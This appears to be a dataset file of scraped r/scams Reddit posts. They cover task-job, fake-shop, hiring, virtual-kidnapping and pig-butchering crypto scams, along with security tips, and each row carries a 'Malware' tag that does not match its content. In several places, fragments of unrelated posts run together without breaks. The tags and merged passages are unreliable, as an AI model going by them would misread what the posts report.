1697161333.0,DigitlHaus Job Scam?,"So... been looking for a job lately and have been applying everywhere, got a text from a random +226 area code number wondering if I was still interested in a job. When I said yes I was messaged on WhatsApp and was ""trained"" on this ""job"" which is essentially pressing ""Start Task"" where it ""optimizes"" a bunch of seemingly legitimate but sketchy fake looking items with low quality images. For example look at the price for the Heritage Drawstring Bag, it's $290 USDT. Also that's the other thing, they start you off with $100 USDT and once you complete 45 tasks you can withdraw your money in USDT into your USDT wallet. In this case I was using LBank (as per the trainer's recommendation). Once the funds are in your wallet you can sell it on LBank to a merchant who sends you the USDT equivalent in the funds of your choice in whatever payment method you want. In my case I chose to sell the USDT's in CAD funds and receive the funds via Interac/e-transfer. I did get the funds mind you. The catch is you encounter a ""combo product"" where it will lock 2 products in together and you will have a negative balance (see picture showing -$942.2) and you will have to deposit your own funds to make it 0, when you do, you can ""submit"" the combo products and continue doing your 45 tasks. At the end you can make a withdrawal again. Here's where it gets sketchy, when they pay you the ""salary"" Day 2, 4, 15, 30, etc, 2 minutes after you ""randomly"" get a combo product and your funds are locked again where you're in a negative balance and you have to deposit more of your money to get it back. My guess is day 30 you get paid $2500 USDT however 2 minutes after, you get a combo product again which locks your funds and you get a negative balance upwards of $9000-10000 and you have to deposit that amount to get your funds + ""profits"" back. However there's gonna be some sort of system issue or something and that's when the scam sets in. The website FAQ says you have to contact customer service if you want to make a withdrawal of $10,000 USDT or more.

I should also indicate that the ""trainer"" who reached out invited me to a WhatsApp group chat where there's 20 or so people, each with low quality pictures of fake people, like influencers and such and they will all ask very monotone almost robotic and scripted messages to one another or in general in the group chat like: ""Hello everyone! Has everyone done their tasks today?"" and things of that nature. They all reply in the same way, with bad English and grammar, putting unnecessary periods at the end of their sentences.

I can provide more context, tell me what you guys think?

1697151646.0,PSA: Greenya Safety (Not Safe),"Short version: don‚Äôt buy from them.

(Pictures: 1. Contact form not working, taken today, 2. taken today of my ‚Äúorder status‚Äù, 3. Screenshot from when I first put the order through)

I was trying to find these particular Nike slides that I had a pair of and loved but could not find again anywhere. Finally found them on this ‚ÄúGreenya Safety‚Äù shopping site (Greenyasafety.com). A few questionable aspects, particularly that I couldn‚Äôt find any info on the company when I googled them, and the price was lower than other spots, but I decided to take the risk and if it was one of those ones where I never got the package, I would live with the $60 loss; I really wanted those slides. 

Seemed fine when it redirected me to another ‚Äúsecure page‚Äù for my payment info, but I was careful to watch my credit card for suspicious charges after that, just in case I needed to report anything to my bank since I was already a little suspicious. I could have sworn I got an email confirmation with the order number but I cannot find it for the life of me anymore, so not sure if that‚Äôs sketchy or if I‚Äôm just remembering wrong. 

Nothing ever came up, order status never changed, so last week, I decided it was time to use their ‚Äúcontact‚Äù form to follow up since a month had gone by, and of course it doesn‚Äôt work and keeps giving me an error message. I tried using the contact form at different times, still nothing. I made peace with the outcome; I took a risk and it didn‚Äôt work out. I knew that was a potential, and maybe even likely, outcome. 

Today, though, I was contacted by my bank about a suspicious charge on my credit card for over $1000 from a well-known brand. I did not make that charge. At first I didn‚Äôt respond to the text I got about it since I dismissed it as a scammer when I didn‚Äôt see the charge listed in my banking app, but when I got two calls, I opted to call the credit card line myself from within my banking app to see if it was legit (I wanted to be certain). Turns out it was actually them trying to confirm the charge.

So now my card is cancelled and I‚Äôm waiting for a new one in the mail, but I wanted to post about this Greenya Safety, that way if anyone else considering ordering from them googles them like I did, maybe they‚Äôll find this post and learn from my mistake. I don‚Äôt know for sure that they are the reason my card was compromised, but I wanted to post about them anyway and this just pushed me to do it sooner than later.

1697147961.0,How to protect yourself as much as possible,"I see a lot of posts about people getting their identity, banking information, credit cards, etc stolen. I used to work for a bank and am pretty aware of all the crap thieves can do to steal your information so I thought I would help people with the stuff they can do to protect themselves. I wrote this on the other post but figure it deserves it‚Äôs own post. 

Someone asked if thieves can fake Face ID, I‚Äôve not heard of them being able to fake Face ID yet but they can sim swap, fake your IP, and your cookies session as well. When using those methods it‚Äôs pretty hard to fight back and get your money back. For anyone trying to avoid this type of thing it‚Äôs important to put multiple layers of protection in place in order to carry out these types of transactions. The reason why people don‚Äôt do it is because it makes our own lives a bigger PITA and makes it harder to do things on our own, but it‚Äôs worth it to protect yourself. 

A few things you can do: clear your sessions after you login. Go to your banking app and see what sessions you have active and disable them all. Make sure you need to establish a new one every time. 

Set up 2FA (preferably from an authentication app) and realize that no one will ever call or text you asking for this info, if they do it‚Äôs a scam. 

Set up sim protection to protect your phone from a sim swap. Also set a password on all your accounts (bank, phone, utility, etc.)in addition to your personal info so that none of your accounts can be accessed by anyone, including employees, without this password even if they have all your identifying information. 

Sign up for credit monitoring, freeze your credit, and set up a password on all bureaus. 

Use a separate number for your banking and personal so if someone looks you up they can‚Äôt just guess this is the one you use. 

Use a service that keeps your information out of public record. Deleteme and others will do this. 

Use different email addresses by using iCloud relay for everything so if one gets hacked they don‚Äôt have your login information or email for everything. This is a great way to protect your privacy. This also goes for passwords. 

Change your passwords regularly. Don‚Äôt use pet names, regular words, etc. 

Use nonsense answers and not real ones for your challenge questions. Example: What city did you meet your spouse in? Food 

Set up transaction alerts for everything over $50.

Don‚Äôt allow transfers or transactions over a certain amount to take place without multiple authentication methods. 

Protect your email and other passwords as seriously as you would your banking ones. Email very often is the only thing thieves need to ruin your entire life. Turn on 2fa for this and make sure you change passwords regularly. Also, check for where you are logged in and log out of all devices you don‚Äôt need. 

Password protect all phones and devices. 

Don‚Äôt enter your password in a public place, use Face ID for this. Thieves watch you and if they steal your phone and have this you‚Äôre screwed. 

Use temp card numbers for websites. 

Lock your credit cards when not being used. 

If anyone from your bank calls you asking for information, hang up and call the number on the back of your card before giving any info or talking to them. 

Add your credit cards to Google or Apple wallet, you will get transaction alerts for everything. 

Check your statements every month, even if you didn‚Äôt use your card. The only way to fight charges is to catch them in time.",Malware,3487,628,64,0

I've been late on two small AFFIRM payments and have received both email and text messages reminding me. No big deal as they are expected.

 However; I started to receive phone calls as well. I ignored the first call as I didn't want to deal with a bill collector at the time. The second call I answered to on hopes of getting it put on hold for a week. But I could not hear anything from their end. No answer. No reply. No background noise. No music. So I ended the call.

 I've since paid the bills as well as my full balance, this morning. Texts and emails rolled in to confirm. Well I just received another call from AFFIRM with the same results as their last call. No audio at all. Told them I can not hear anything and that my bills were paid. Then I ended the call.

 I'm including the phone number in my screenshot because I am unsure if that is a legit AFFIRM number or a scammer spoofing the name. I'm also having trouble finding Affirm's phone number on their website.

 I've delt with many scammers and I'm not inexperienced or foolish enough to give personal info over the phone. Are these scam calls spoofing the AFFIRM name? Or are they legit? The lack of audio us a red flag to me.",Malware,1220,231,35,0
1697138327.0,Bank account got frauded (Canada),"
Hey reddit. Just trying to help out a friend who was recently a victim of fraud. He woke up last friday to realise that his credit card, savings and line of credit were drained from his bank account. He already filed a police report and contacted the bank as soon as he noticed. The bank got back today saying that he will not be eligible for a refund since the bank believes that he is responsible for the transactions as face ID was used and on the same IP address as per what the cybersecurity team said. I know that he was alone that night and there is no way anybody had access to his phone.

Have frauds become that sofisticated that hackers can access iphones to drain accounts using face ID? We are really trying to figure out how this could have happened and to see how to fix this situation.

She was asking about the location and said she found my post through google (I don't have any hashtags on the post so this feels like the most sus part). Apart from that though, everything feels legitimate. Her profile looked like a normal profile with a year of post history and there were multiple travel locations, which fit with her saying she loves traveling and that's why she was asking me about it. At first I was expecting a scam so I was on high alert but continued the conversation to see where it was going. She wanted to have a quick video call and I could see she is who her profile shows. After that she wanted to move to WhatsApp and the phone number matches the area she said she lives in.

At this point I saw her profile was in a language I've been learning and we've been chatting a lot in said language to help me practice it. It's only been a few days but there hasn't been much to trigger a scam alert in my head. Does this sound like a scam anyone here has heard of?

Summary of evidence for it being a scam and not being a scam:

Scam:

-Random instagram DM

-Moved to WhatsApp

-Mentioned following crypto/financial trends a couple times (but didn't push that topic further, just said it was among her interests)

Not scam:

-Normal-looking account

-Details are consistent

-Hasn't pushed anything scam-like after a few days

I felt bad for the first guy and gave home a subway gift card and he fixed the dents. That car was stolen and I bought a bmw of the same color but had scratches on it. New person tries the same scheme claiming he could remove the scratches and I accept because I wanted the scratches gone and the dents. but he asked for 100$ and I told him I only had 25$. When he finished I gave him the money and he looks pissed claiming he gave me more and his son has leukemia. I told him that I warned him and it was his fault for not listening. He later gets aggressive and insists I check my pockets. Staring at them. I start pleading in Spanish and he gets confused and I tell him I just got into the country and trump is kicking me out so he says ‚Äúf-word trump‚Äù and decides to take whatever gas I had put in my pump.

1697033510.0,Sophisticated Weigel Broadcasting hiring Scam,"Warning! Video Editors please be aware of this sophisticated looking hiring scam via email. They claim to be from Weigel Broadcasting. I think the rules of this reddit group say I can't post contact info but the email address had the words @ hireweigelbroadcasting in it..... The first name in the email address was a C name but I cant say the name since this forum says No personal info allow.

It was odd that the email came in at 5:36 in the morning. But not necessarily the true sign of a scam because once in a blue moon I work really early as well. But that was **the first red flag**. The email read:

*Dear {redacting my first name}*

*This email serves as a courtesy notification that your resume has been reviewed by the¬†¬†  WEIGEL BROADCASTING CO.¬†HR team and you have been shortlisted for an online interview/job briefing for the position of FREELANCE VIDEO EDITOR at¬†¬†  WEIGEL BROADCASTING CO.¬†We have evaluated your resume and found  your background and qualifications impressive. Hence, we would like to  invite you for a further discussion regarding the job role and your  fitment for it. The goal of this interview is for us to get to know you  better, and for you to ask any questions you may have. We want to make  sure that your goals and ambitions match our company‚Äôs culture and  position. Kindly go through the attachment below for information on how  to schedule your interview, Looking forward to hearing back from you  soon!*

*Best Regards*

*(name redacted)*

*HR Director*

*Weigel Broadcasting Co.*

In the body of the email, the words that were capitalized were put in the color green which I **found odd**. I didnt remember applying for this job (**that was the 2nd red flag**) but then again I get so busy with work who knows what I've applied for in the past. But I started to read the PDF they sent. In the PDF it said that they would send equipment. **That was the 3rd red flag.** It's not unheard of but it is kind of rare to tell a freelance you're going to send them equipment when usually you rely on them to provide their own equipment. It said:

    Candidates who are selected for this position will be trained remotely and must be able to work from home in a designated work area with company-provided technology equipment.
    You will be advised on how to receive the following devices:
    Apple iMac Pro (27"" 5K Retina Display; 1TB SSD.)
    MacBook Pro 2021 16‚Äù (M1 Max)
    AKG K712 Pro Reference Headphones.
    Sony Œ±7R IV 35 mm full-frame camera with 61.0 MP
    Altwork Workstation

**No seriously, what the hell does a video editor need a ""Sony A7r"" camera for?!** This isnt a shooter/editor job. *(Cause scammers are stoopid)*

Interestingly enough the PDF mentioned a pay rate of $75-$85 an hour which is roughly what I charge my clients so I suspect this scammer did their homework on me, or has had some kind of contact with me before maybe pretending to be a different job posting asking my rate???

After the 3rd red flag I went to linkedin and looked up this person whose name starts with C. Sure enough there was a linkedin profile matching that persons name and job description but that still doesnt mean this job is legit. The emailer could pretend to be the woman on linkedin.

My next task on Linkedin was to connect with other HR people who work at that same company. (You press the connect button on linkedin and they let you send a tiny message to the person you're trying to connect with and in that intro message I asked this HR person if he could help me identify whether or not this is a scam). This HR person accepted my linkedin request and they claim the real C-Named person doesnt even use an email address with the word weigel in it. That's when I knew for sure it was a scam.

I went to the person emailing me (the scammer) and said I dont see anyway to schedule this interview like your paragraph says. And they emailed me back and said ""Kindly send your email address to me, I will add you up myself on Microsoft Teams to proceed with the Interview."" I said you have my email address, it's how you contacted me! Their response: ""If that's your preferred¬†email address I will add you up."" .....17 minutes later ""Check you Microsoft Teams"".

why do I need to go on microsoft teams to schedule the interview? because its a SCAM SCAM SCAM! YOU SHOULD'VE SEEN THE PDF THEY SENT ME. IT LOOKED PRETTY LEGITIMATE (for the most part). Watch out folks. dont trust anyone, ever. Always do your homework. ",Malware,4474,801,93,0

It's sometimes weird amounts, like $7 or $22 but usually it'll be like $40 and a couple times $100. In total it's been about $600 over the last 4 months. In the last couple of weeks, he's asked me to Venmo him, let's say, $30. But then he'll text me an hour or so later and ask can I send it to his Cashapp instead if he sends it back. Or vice versa. It's happened 4 times now. 

After the last time I told him no and he got a little upset. I explained I didn't understand why he would ask me to send money on one app only to turn around, send it back to me and ask to send it to another app. He said some places he shops online don't take one or the other, which still doesn't make any sense. If you know a site only takes Venmo, then why are you doing Cashapp? Additionally he stated he doesn't have a bank account so that's part of the problem in using these apps. But again that makes no sense: how are you able to receive and send money on these apps without a bank account or at least a credit card? I told him I wouldn't be sending him money anymore. I didn't ask for it back since I know he's struggling and even before this happened, I was planning on telling him I was done lending him money because he was being super picky about finding a job.

Never saw a document, never signed anything, never saw who he is talking to, but they found a core story weakness that they coul leverage to make him believe the story.

We tried reasoning him, even after explaining how scammers leverage online profile to make them believe they have a connection with them and trying to get him to show us some proof of validity, he refutes and degrade the people he loves in order to not shatter his reality as he is in too deep financialy.

We called the police, had them visit him to discuss, he didn't flinch and continued saying he was under control. Obviously he doesn't want to provide any information because ""it could ruin the project"".

1696975704.0,Beware of Crypto Scams: My Personal Experience,"Hey Reddit Community,

I hope you're all doing well. Today, I want to share a deeply personal and embarrassing experience that I recently went through. I believe it's essential to talk about it openly, not only to get it off my chest but also to warn others about the dangers of crypto scams.

To give you a brief overview, I met someone here on Reddit, and we struck up a friendship. We never discussed crypto until I casually mentioned that I had mined some coins before the major market shift. That innocent conversation led to me being introduced to the world of decentralized finance (DeFi) wallets and the promise of passive income.

I started small, naturally cautious, and things seemed to be going well. I gradually invested more, pulling from my savings, and even took out a $10,000 loan. The allure of earning more than my stable but modest income was irresistible. Things escalated, and soon I was earning significant amounts, or so I thought.

Then came the turning point. I received an email from the loan company, informing me that I was pre-approved for more funds. I should've recognized the warning signs and resisted the temptation, but I didn't, and it led to disastrous consequences.

Cutting to the chase, I ended up with $47,000 NZD ($40k of that was the loan and 4k my own personal money that I had saved over time) in my account, feeling on top of the world. But just as quickly as it came, it vanished. On a Monday morning, my account showed a devastating $0 balance. Now, I'm left with a loan I can't afford, a heart full of regret, and a mind clouded with dark thoughts.

I share this not for pity but as a cautionary tale. Please, be vigilant. Scammers prey on our vulnerabilities and dreams. Don't fall into the same trap I did. I know I can't change what happened, but if sharing my screenshots and story can help even one person avoid this nightmare, it will be worth it.

Remember, it's okay to ask for help and support. We're a community, and together, we can navigate the often treacherous waters of the internet.

Take care,

So I try to apply for as many jobs that I'm qualified for as I can. Which means I'm often using easy apply on indeed. I admit I don't always scrutinize the job post and research the company before applying. (My bad.) So last week I applied for a job at a company that appeared legit at first glance. Yesterday I received an email from a supposed recruiter from a different company who said she found my resume on a job board and they had a job she thought would be a good fit for me and she provided the company name, hiring coordinators name and an email address who I should reach out to if I was interested in pursuing. There were several red flags in the email message that made me suspicious so I decided to do more research. I looked up the company listed in the email and they are real. Then I looked up the name provided in the email on LinkedIn and yes, she is an actual employee at the actual company. However when I did a job search on the company website, the role I was contacted about was not listed. I sent the hiring coordinator a connect request through LinkedIn to let her know I was interested in learning more about the job. She responded that she does not know anything about the job, there is no such opening at their company, etc. So the scammer picked a real company and a real person, set up a fake email address and was impersonating them. 

When I went to report the job post on indeed it had been taken down. But I could see more than 2100 people had also applied for this ""opportunity"" and I imagine we all received that same email. I wonder how many other job candidates took the time to research like I did, before responding to the fake email. And now this scammer has all the personal contact info and work histories for 2100+ people!!!! What do you think they're doing with that info? Besides indeed (who I highly doubt is going to do any kind of investigation), is there anyone else I should be reporting this to?

1688926798.0,"Please help, Random People keep showing up at my apartment building to meet up from dating websites I‚Äôve never been on!","(Note: sorry for long post, I‚Äôll post a TLDR in the comments) 

Okay so, I‚Äôve had my fair share of experiences in my life. As such im fairly aware of this being an occurrence in suburban neighborhoods where random people off dating websites will use random addresses to try and lure people out. Either to scam them, troll them, rob them, or all of the above.

Now as much as I‚Äôm aware of this, I‚Äôve NEVER seen it happen in the city before! I live in NYC, and am in a apartment building, this shouldn‚Äôt be happening. I only just recently moved here (5 months ago), I‚Äôm unsure if perhaps this was an old address of someone else?..

Just today, two guys showed up about an hour apart from one another. First guy said his name and I told him I don‚Äôt know him and he probably rang wrong door. I told him I‚Äôd let him in the building though (bad mistake of my part, it‚Äôs just that it‚Äôs commonplace where I live for people to be locked out of a building or be looking for other tenants). Once he arrived to my door and knocked again, I reminded him that he likely has the wrong person. He decided to leave. About an hour or less later, another person arrived. I looked through my buzzer system and saw yet another random individual, I asked who, he told me his name. I told him he probably has wrong person/apartment. He hears my voice and says ‚Äúno, we were talking on Grinder.‚Äù I exclaim, what no you‚Äôve got the wrong person. And shut it, my thoughts are that someone is either using my address or that one of those two decided to try and meet up here. Which still doesn‚Äôt make sense to me‚Ä¶

Im tired of these people showing up. I came today to see if anyone knows of something that I can do to stop/prevent this from continuing to happen?

1560379393.0,New (to me) Type of Virtual Kidnapping,"I'm in Mexico on business -- I travel a bit. I also consider myself generally savvy and aware of scams. I knew about virtual kidnapping and all that, but I'll admit that my asleep brain fell for this for just a little bit. I hadn't seen this before, so I thought I'd share.

&#x200B;

I got a phone call on my room phone in my hotel late last night, when I was already asleep asking if I knew a person by the name of X. I do actually know someone by that name, but it is a very, very common name. I was sleep-addled, so this first conversation didn't quite register with me and I accepted the call. X came on the line and then proceeded to tell me that he was a member of cartel Y (a real cartel, by the way) and that they were going through the building because some head guy of another cartel was there and they were going to murder him. Did I understand? He's downstairs at the front desk, and there is going to be trouble.

&#x200B;

I should have immediately hung up, but my mind was not fully awake, and I'm in Mexico, so this was not necessarily entirely 100% unbelievable. I'm in a particularly violence-prone region of Mexico, after all, and that's saying a lot. If I wanted to live, he told me, I would need to follow instructions to the letter. First, as they are going through the building, keep my door locked and do not go outside because there are big bad men with big guns about. Then some questions about who I am and why I'm here -- I did not provide detail, and he got kind of pissed off, but I could play it off as not fully understanding his questions. Meanwhile, I'm thinking that this could be a scam, but then again, who knows and WTF?

&#x200B;

I'm told I need to keep the hotel phone off the hook and transfer to a mobile number. I made a huge mistake in giving them that, because I was still just not quite certain what was going on and frankly, a little nervous about the whole thing. We transfer to mobile, and I have to answer a succession of calls. Of course, questions are: do you have any other phones? Laptop? Turn it all off and stay on the line if you want to stay alive. Obviously, in retrospect, this is about isolation.

&#x200B;

I'm told I cannot stay at this hotel. I have to get dressed, grab whatever cash I have, any medications I need, my glasses and other necessaries, my phone charger and put them all together, because I need to move to another hotel about two blocks away. Right next to the hotel, I'm supposed to buy a new prepaid cellphone with a Mexican number. The people at the hotel (front desk) don't want any trouble, so don't play games with us, because we're going to kill you if you so much as stop there. Don't run, walk calmly. Just make your way out the door, get the phone, we'll be waiting at the store next door, and then you'll go to the new hotel. That hotel, by the way, is a real hotel.

&#x200B;

I'm told to start making my way downstairs. In passing the front-desk, I'm supposed to lower the phone but keep it on -- never hang up -- and absolutely never make contact with the people at the front-desk. After all, they don't want any trouble. Make any mistakes and you're dead. I take the stairs, not the elevator, because I'm looking for a way out. In my mind, there are two possibilities: 1) this is a scam that I do not understand, or 2) this is real, in which case the absolute very last thing I am ever going to do is hand myself over willingly to some self-professed cartel dude. On my way down, I look for possible exits. At the bottom of the stairs, there is an area where you cannot be seen from outside, but the front-desk can see you. I stop there to think about my options. It's next to the kitchen, and I am considering disappearing in there.

&#x200B;

I can now see the front-desk. The young woman who mans the desk does not look at all like someone beset by cartel Y dudes roaming about the hotel. I gesture for her to come over, which she does. I cover the microphone on the my phone (at least, I think I did) and tell her what's going on and ask for help. ""Hang up,"" she says. ""It's a scam."" I'm a little shaken and she gets me a drink to help calm me down. I am a mixture of embarrassed, relieved, and agitated. She calls the security guard over and shows me the cameras they have all over the place and tells me it's quite safe, and she then explains to me how this is supposed to work. Once I calm down and get back up to my room, I am still a little agitated, so I look this up online and find some additional information (included below).

&#x200B;

Here's how the scheme is supposed to work. 1) they isolate you by keeping you on the line and making you shut off any other devices; 2) they get you to get a new prepaid phone (preloaded with exactly 50 pesos, which will last a while; 2) then, you are directed to your new (real hotel). There is never an actual meeting with anyone, they just keep you on the line. 3) They make you get rid of the sim card in your regular phone -- to disable any kind of GPS tracking; 4) they set you up in the new, very real, hotel nearby, and keep you on the line there; 5) They get you to engage in a skype conversation on the new phone, so they have pictures of you. At this point, you are completely isolated. In a new room, where you are threatened with death if you step outside the door. You cannot be reached by anyone but them, because only they have your new number. That is where stage 6) starts: now they call your family and tell them that you have been kidnapped and that they will start cutting off fingers if money is not paid very quickly. They have your pictures to prove it, and you are not only incommunicado but also not to be found in your hotel room.

&#x200B;

It's a virtual kidnapping that eliminates the chance of your family reaching you to find out you're okay. Assholes. I am actually deeply embarrassed that I fell for any of this, but I am putting it up on the off chance that someone might read it and be forewarned.

1697450195.0,PSA-Wedding scammer-Sydney-Australia,"Hello,  
I rarely post on reddit but I do believe this is an important PSA.  
My fiancee and myself are getting married next year in  NSW-Australia  We consulted Christopher(from Orchard Catering) in June to do the catering for our wedding. He asked for a first deposit which we did and then another deposit 2 months later which we did again as he said he would give us a 10 % off the final quote as he was running a special offer. We took on the offer.

After he cancelled 3 appointment with us within 24 hours where we were supposed to meet, we decided to terminate our contract with him. due to his poor professional behaviour. As per contract, we were entitled for a refund.  
He then revealed that he had filed bankruptcy in July after he received the first deposit.(official document states that bankruptcy was filed 2 weeks after our first deposit) and that he owns money to multiple other people). He admitted without remorse of asking for a second deposit even though he knew he was bankrupt.

The Australian financial Security Authority is aware but can only help us partially. We won't be able to get our big deposit back.

The most appalling part is that he has admitted to have taken money from multiple couples for their wedding and none of them knows anything about this situation.  
He has removed reviews from google .

What was meant to be the best day of our lives has taken a sour turn.  
Are there any ways we can warn couples and businesses that they are likely not to receive any services from Christopher(orchard catering) for their big day? We don't want other people to be scammed as we did

1642035397.0,"I was scammed by a fake job offer on Upwork. I spent all day interviewing, got sent a fake check, and almost sent $2200 off my own money to a third party ""vendor"" in order to buy home office equipment","Annoyed, but I figured I should record the scam as it was new one for me, and super elaborate (compared to scams I've experienced before). The[ fake job posting is still up](https://www.upwork.com/jobs/~01c541b3b3c88a2665) at the time of this posting.  

I was invited to look at a job by a ""recruiter"" on Upwork, the job posting looked good so I spent a proposal, my proposal was accepted and I was offered an interview.

I was sent an email address from a ******@savershrm.com - I googled ""savershrm.com"" and it resolved to Savers.com. That was the first red flag that I missed. 

The interview was done through the Wire app, and it was done via text, which was the second red flag I missed. 

The ""interview"" took over an hour, and I was surprised by the incompetence of the interviewer (third red flag) but I also figured that recruiters don't understand graphic design. I had multiple moments where I thought, ""Haha, this person is a moron. I am playing them like a fiddle."" 

After the ""interview,"" there was a two hour period where my answers were ""reviewed"" by the board of directors. I was then offered the position, and sent a [fake contract](https://imgur.com/a/UFgaem1). 

Then, my new fake boss explained that I was supposed to purchase office equipment, and I was sent a [fake check](https://imgur.com/a/jqmBZzp) that I was asked to print out and deposit via my mobile banking app. Are we still counting red flags?

Let me tell you, my dumb ass tried to deposit this low res fake check about 6 times, and at *no point was I suspicious*. I was stoked for my new job, and offered to cover the cost of the office supplies with my own money, with the plan to deposit the check in person at the bank tomorrow. 

My new fake boss then directed me to send $1000 via venmo to his vendor (the first of multiple planned transactions). I kept offering to use a debit card. They asked if I could do Zelle. I opened a Zelle account. I came so close to actually sending this money. 

There was a problem with Zelle, and my ""oh fuck"" moment came when my new fake boss asked ""What Department/Grocery store  is close to you?"" and I realized, all of a sudden, that none of this made any sense. 

I googled around for a little bit trying to confirm that I was being scammed, and couldn't find any page detailing what I was going through. I noticed the client was interviewing with 16 other people on Upwork for this job they had already offered me. I reported them on Upwork, and I am self reporting here on r/scams for being a total fucking moron.

If I open a dispute after the original due date, does this leave me stuck later when I can't open another dispute for the same item?

From the outset, we agreed on specific timelines for the project, but unfortunately, those were not adhered to. Even after allowing for some flexibility and granting extensions, the project remains significantly delayed, causing a substantial disruption to my business plans and expectations.

Communication throughout this process has been lacking, leaving me in the dark about the progress and status of my website. It's disheartening to feel like my concerns were not taken seriously, and updates were infrequent and inadequate.

While I initially had trust in the capabilities of them, the prolonged delay and lack of transparency have raised doubts about their reliability and professionalism. I had hoped for a smoother and more efficient experience, but unfortunately, that has not been the case.

I would encourage them to seriously reflect on their project management and communication processes to ensure they can meet their commitments and provide a more satisfactory experience for their customers in the future.

1683335744.0,Justice Dept. Seizes Over $112M in Funds Linked to Cryptocurrency Investment Schemes Used In Pig Butchering Scams,"LOS ANGELES ‚Äì The Department of Justice announced today that it has seized virtual currency worth an estimated $112 million linked to cryptocurrency investment scams commonly called ‚Äúpig butchering.‚Äù

Seizure warrants for six virtual currency accounts were authorized by judges in Los Angeles, the District of Arizona, and the District of Idaho. In the Los Angeles matter, a United States magistrate judge authorized the seizure of an account containing approximately $66.4 million in various cryptocurrencies after finding probable cause that the funds were derived from wire fraud schemes.

According to court documents, the six virtual currency accounts were used to launder proceeds of various cryptocurrency confidence scams. In these schemes, fraudsters cultivated long-term, online relationships with victims, eventually enticing them to make investments in fraudulent cryptocurrency trading platforms. In reality, the funds sent by victims for these purported investments were instead funneled to cryptocurrency addresses and accounts controlled by scammers and their co-conspirators.

‚ÄúThe victims in Pig Butchering schemes are referred to as ‚Äòpigs‚Äô by the scammers because the scammers will use elaborate storylines to ‚Äòfatten up‚Äô victims into believing they are in a romantic or otherwise close personal relationship,‚Äù according to the affidavit in support of the Los Angeles seizure warrant. ‚ÄúOnce the victim places enough trust in the scammer, the scammer brings the victim into a cryptocurrency investment scheme.‚Äù

The scammer attempts to create the appearance of legitimacy by fabricating websites or mobile apps to display a bogus investment portfolio with large returns, the affidavit states. In relation to the Los Angeles-based account seizure, the FBI has identified at least 10 victims who were unable to withdraw funds they had invested, with the seized account containing some funds from all 10 victims.

Authorities executed the Los Angeles seizure warrant in December and received the last transfer of cryptocurrency on March 21.

How do I know this website is a scam? Well here's my story. 

I was looking for a puppy, I stumbled upon this website for teacup maltese puppies! They showed that they had some available for sale.

On this website it claims you can have the puppy shipped to you! For extra fees and such well I contacted the phone number messaged them back n forth for a week! Then asked if I could just pick up the pup at the location posted on the website. 

They said sure but they couldn't hold any puppy without a deposit! Well I didn't put a deposit down, luckily! I said I was willing to take the risk! Of which ever puppy was left available.

Well I drove about 6 hours, yesterday I got to there house! I called them 3 times they never answered I text message them allot keeping them updated on my travel time. Also text them when I arrived, well they didn't respond.

So I drove to a near by school! And sat in the parking lot for an hour just to find out they emailed me saying they don't have the pups available anymore,  eventhough there website still shows available pups.

So I made another email! Messages them they respond to that email saying all the pups were available for sale.

So end of the story is dont trust that website.
& do not put any deposit down for any pups that u can't see in person. 

I hope no one else gets there money robbed.

Post will ALWAYS have comments off (which is odd because if you truly wanted to connect with the owner/parent you would leave comments on so they can contact you). 

Post will be meant to be extreme (injured, gory in this case, cold/hungry, turned into pound/police, etc.). No specific details about location found- just road or off highway. 

Scam purpose? Get lots of share and engagement on the post and then change it, and sell the account after a while. A lot of these come from hacked or cloned accounts as well so they look legit. Accounts with good engagement are worth $-$$. The post will be changed after a while into a rental listing scam, a scam sale item, or phishing link. The scammer does this to get more eyes on their scam as well as build ‚Äúlegitimacy‚Äù since people‚Äôs friends are sharing it. Scammers also hope people will message the account trying to ‚Äúhelp out‚Äù with money or other offers.

1620769628.0,Asian guy/girl from online dating mentors you to invest in Forex/Cryptocurrency Trading -- Sha Zhu Pan ÊùÄÁå™Áõò or Pig-Butchering Scam,"I  want to raise awareness on this Pig-Butchering scam or Sha Zhu Pan in Chinese. So called because victims are patiently worked on  everyday for 1-3 months before scamming them big time, like fattening up a pig before slaughter. Basically, the scammer induces the victim into putting more and more money into a sham investment platform.

They are seriously well-planned operations (latter half of this post) and have really been successful in the Chinese-speaking world, so much so that Sha Zhu Pan has become one of the top Chinese buzzwords in 2019-2020.  Victims are scammed on average $50k, and millions have been  lost. It's a huge cottage industry that Chinese police has had a hard time stamping out. There are scores of recent news stories, blogs, video  clips, and other media online about Sha Zhu Pan victims and scammers. Sadly, *almost all are in Chinese*. I think the rest of the world has to wise up to this, because now as most Chinese are becoming aware of this Pig-Butchering Scam,  the scammers are turning their skills more towards non-Chinese, more so this year.

This first half is somewhat detailed, because since everyone is generally aware of romance scams, being vague won't convince someone who is in the thick of it and thinks that his/her online friend is THE exception. Exposing specific details of the Pig-Butchering scam is most convincing to current victims that the ""spontaneous"" events are actually planned.

Common tactics of the Sha Zhu Pan scammer:

1. greets you ""good morning"" and ""good night"" *every day*
2. always asks/share pictures of food. Their ""home-cooked"" food looks restaurant quality
3. are sole owners of beauty salons/restaurants/hospitals/apartments/businesses etc
4. casually talks about spending tens and hundreds of thousands of US dollars like no big deal (makes you feel small)
5. typically by 2nd-3rd week of talking everyday brings up an investment/trading website
6. studied finance/accounting, or have uncle/aunt/brother/professor who taught them Forex/Crypto trading.
7. talks a lot about fate and destiny.
8. asks what are your material goals and dreams, and say you're not dreaming big
9. trade on irregular schedules, based on a day's ""data""/candle stick charts/insider info. Sometimes they say ""tomorrow's data is not  good, I'll just go by myself"", sometimes ""today is a go!"" (to intrigue you)
10. laughs at how ""small"" your investment is
11. When some event causes huge losses for both you and the guy/girl, he/she suggests you borrow from the website.
12. When you're compelled by the website to pay some ridiculous amount, the guy/girl offers to ""help"" you pay half or so. You never see their money though because they pay directly to your ""account"".
13. guilts you, blames you, gaslights you, flip out easily, shames your  manhood/adulting skills/commitment to relationship, accuses you of  character defects, anything that hits home
14. always have an excuse for not wanting to meet up or do video chat -- bad experience with exes, pandemic, etc. Actually, they really can't. They're not where you think they are.

Common elements of the sham trading platform website:

1. Highly responsive ""customer service"" online or on WhatsApp, available to chat 24/7. They are always oh so courteous and never break character, no matter how much verbal abuse you  dish
2. When you've put <$10,000, you can take your money and earnings in and out
3. Offers large bonuses if you invest 30-100% more by a certain date soon (like this weekend).
4. Once you put in substantial amounts of money, the slaughter: You'll never be able to take anything out ever again.
5. To pay back ""reserve loans"", ""taxes"", ""verification fees"", anything, you have to *pay from outside;* they **cannot** be deducted from your ""account"" inside (they never say so beforehand).
